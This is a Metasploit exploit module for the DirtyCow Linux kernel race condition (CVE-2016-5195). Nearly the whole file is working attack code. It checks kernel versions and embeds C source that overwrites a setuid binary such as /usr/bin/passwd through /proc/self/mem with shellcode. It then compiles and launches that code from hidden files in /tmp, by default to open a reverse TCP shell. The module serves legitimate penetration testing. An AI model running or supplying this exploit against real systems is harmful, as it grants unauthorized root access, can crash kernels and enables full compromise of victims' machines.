##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Local
  Rank = ManualRanking

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::Kernel
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Linux Kernel DirtyCow Local Privilege Escalation',
      'Description'    => %q{
        This module exploits a race condition in the way the Linux kernel's
        memory subsystem handled the copy-on-write (COW) breakage of private
        read-only memory mappings. An unprivileged local user could use
        this flaw to gain write access to otherwise read-only memory mappings
        and thus increase their privileges on the system.

        The bug has existed since around Linux Kernel 2.6.22 (released in 2007).

        Note, failed exploitation attempts will likely crash the kernel.

        Successful explotiation will replace the specified setuid binary.

        This module has been tested successfully on:

        Fedora 23 Server kernel 4.2.3-300.fc23.x86_64 (X64)
      },
      'License'        => MSF_LICENSE,
      'Author'         => [
        'Phil Oester',  # Vulnerability discovery
        'Robin Verton', # cowroot.c exploit
        'Nixawk',       # Metasploit
        'bcoles',       # Metasploit
      ],
      'Platform'       => [ 'linux' ],
      'Arch'           => [ ARCH_X86, ARCH_X64 ],
      'SessionTypes'   => [ 'shell', 'meterpreter' ],
      'References'     =>
        [
          ['CVE', '2016-5195'],
          ['URL', 'https://dirtycow.ninja/'],
          ['URL', 'https://github.com/dirtycow/dirtycow.github.io/issues/25'],
          ['URL', 'https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails'],
          ['URL', 'https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs'],
          ['URL', 'https://access.redhat.com/security/cve/cve-2016-5195'],
          ['URL', 'https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=19be0eaffa3ac7d8eb6784ad9bdbc7d67ed8e619']
        ],
      'Targets'        =>
        [
          [ 'Linux x86', { 'Arch' => ARCH_X86 }],
          [ 'Linux x64', { 'Arch' => ARCH_X64 }]
        ],
      'DefaultOptions' =>
        {
          'AppendExit'       => true,
          'PrependSetresuid' => true,
          'PrependSetresgid' => true,
          'PrependSetreuid'  => true,
          'PrependSetuid'    => true,
          'PrependFork'      => true,
          'PAYLOAD'          => 'linux/x86/shell_reverse_tcp'
        },
      'DisclosureDate' => 'Oct 19 2016',
      'DefaultTarget'  => 0))

    register_options([
      OptString.new('SUID_EXECUTABLE', [true, 'Path to a SUID executable', '/usr/bin/passwd'])
    ])
    register_advanced_options([
      OptString.new('WritableDir', [true, "A directory where we can write files (must not be mounted noexec)", '/tmp'])
    ])
  end

  def base_dir
    datastore['WritableDir']
  end

  def suid_exe_path
    datastore['SUID_EXECUTABLE']
  end

  def upload(path, data)
    print_status "Writing '#{path}' (#{data.size} bytes) ..."
    rm_f path
    write_file path, data
    register_file_for_cleanup path
  end

  def strip_comments(c_code)
    c_code.gsub(%r{/\*.*?\*/}m, '').gsub(%r{^\s*//.*$}, '')
  end

  def upload_and_compile(path, data, gcc_args='')
    upload "#{path}.c", data

    gcc_cmd = "gcc -o #{path} #{path}.c"
    if session.type.eql? 'shell'
      gcc_cmd = "PATH=$PATH:/usr/bin/ #{gcc_cmd}"
    end

    unless gcc_args.to_s.blank?
      gcc_cmd << " #{gcc_args}"
    end

    output = cmd_exec gcc_cmd

    unless output.blank?
      # Uncomment this when the exploit code doesn't throw a bunch of warnings
      #fail_with Failure::Unknown, "#{path}.c failed to compile"
      # Until then:
      print_error 'Compiling failed:'
      print_line output
    end

    register_file_for_cleanup path
    chmod path
  end

  def check
    if selinux_installed?
      if selinux_enforcing?
        vprint_error 'SELinux is enforcing'
        return CheckCode::Safe
      end
      vprint_good 'SELinux is permissive'
    else
      vprint_good 'SELinux is not installed'
    end

    version = Gem::Version.new kernel_release.split('-').first

    if version.to_s.eql? ''
      vprint_error 'Could not determine the kernel version'
      return CheckCode::Unknown
    end

    unless version >= Gem::Version.new('2.6.22') && version < Gem::Version.new('4.8.3')
      vprint_error "Kernel version #{version} is not vulnerable"
      return CheckCode::Safe
    end

    # This could use some improvement for 4.x kernel release parsing...
    if (version <= Gem::Version.new('4.4.26')) ||
       (version >= Gem::Version.new('4.7') && version < Gem::Version.new('4.7.9')) ||
       (version >= Gem::Version.new('4.8') && version < Gem::Version.new('4.8.3'))
      vprint_good "Kernel version #{version} appears to be vulnerable"
      return CheckCode::Appears
    end

    vprint_error "Kernel version #{version} may or may not be vulnerable"
    CheckCode::Unknown
  end

  def on_new_session(session)
    print_status "Setting '/proc/sys/vm/dirty_writeback_centisecs' to '0'..."
    if session.type.to_s.eql? 'meterpreter'
      session.core.use 'stdapi' unless session.ext.aliases.include? 'stdapi'
      session.sys.process.execute '/bin/sh', '-c "echo 0 > /proc/sys/vm/dirty_writeback_centisecs"'
    elsif session.type.to_s.eql? 'shell'
      session.shell_command_token 'echo 0 > /proc/sys/vm/dirty_writeback_centisecs'
    end
  ensure
    super
  end

  def exploit
    if check == CheckCode::Safe
      fail_with Failure::NotVulnerable, 'Target is not vulnerable'
    end

    if is_root?
      fail_with Failure::BadConfig, 'Session already has root privileges'
    end

    unless setuid? suid_exe_path
      fail_with Failure::BadConfig, "#{suid_exe_path} is not setuid"
    end

    unless cmd_exec("test -r #{suid_exe_path} && echo true").to_s.include? 'true'
      fail_with Failure::BadConfig, "#{suid_exe_path} is not readable"
    end

    unless writable? base_dir
      fail_with Failure::BadConfig, "#{base_dir} is not writable"
    end

    main = %q^
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <unistd.h>

void *map;
int f;
int stop = 0;
struct stat st;
char *name;
pthread_t pth1, pth2, pth3;

char suid_binary[] = "SUID_EXECUTABLE";

SHELLCODE

unsigned int shellcode_size = 0;


void *madviseThread(void *arg)
{
  char *str;
  str=(char*)arg;
  int i, c=0;
  for(i=0; i<1000000 && !stop; i++) {
    c += madvise(map,100,MADV_DONTNEED);
  }
  printf("thread stopped\n");
}

void *procselfmemThread(void *arg)
{
  char *str;
  str = (char*)arg;
  int f=open("/proc/self/mem",O_RDWR);
  int i, c=0;
  for(i=0; i<1000000 && !stop; i++) {
    lseek(f, map, SEEK_SET);
    c += write(f, str, shellcode_size);
  }
  printf("thread stopped\n");
}

void *waitForWrite(void *arg) {
  char buf[shellcode_size];

  for(;;) {
    FILE *fp = fopen(suid_binary, "rb");

    fread(buf, shellcode_size, 1, fp);

    if(memcmp(buf, shellcode, shellcode_size) == 0) {
      printf("%s overwritten\n", suid_binary);
      break;
    }

    fclose(fp);
    sleep(1);
  }

  stop = 1;
  system(suid_binary);
}

int main(int argc, char *argv[]) {
  char *backup;

  asprintf(&backup, "cp %s /tmp/bak", suid_binary);
  system(backup);

  f = open(suid_binary,O_RDONLY);
  fstat(f,&st);

  char payload[st.st_size];
  memset(payload, 0x90, st.st_size);
  memcpy(payload, shellcode, shellcode_size+1);

  map = mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0);

  pthread_create(&pth1, NULL, &madviseThread, suid_binary);
  pthread_create(&pth2, NULL, &procselfmemThread, payload);
  pthread_create(&pth3, NULL, &waitForWrite, NULL);

  pthread_join(pth3, NULL);

  return 0;
}
^

    payload_file = generate_payload_exe
    exploit_path = "#{base_dir}/.#{Rex::Text.rand_text_alpha 8..12}"
    backup_path = "#{base_dir}/.#{Rex::Text.rand_text_alpha 8..12}"

    main.gsub!('SUID_EXECUTABLE', suid_exe_path)
    main.gsub!('/tmp/bak', backup_path)
    main.gsub!('SHELLCODE') do
      # Split the payload into chunks and dump it out as a hex-escaped
      # literal C string.
      Rex::Text.to_c payload_file, 64, 'shellcode'
    end
    main.gsub!('shellcode_size = 0', "shellcode_size = #{payload_file.length}")

    upload_and_compile exploit_path, strip_comments(main), '-pthread'

    print_status 'Launching exploit...'
    cmd_exec "#{exploit_path} & echo "
  end
end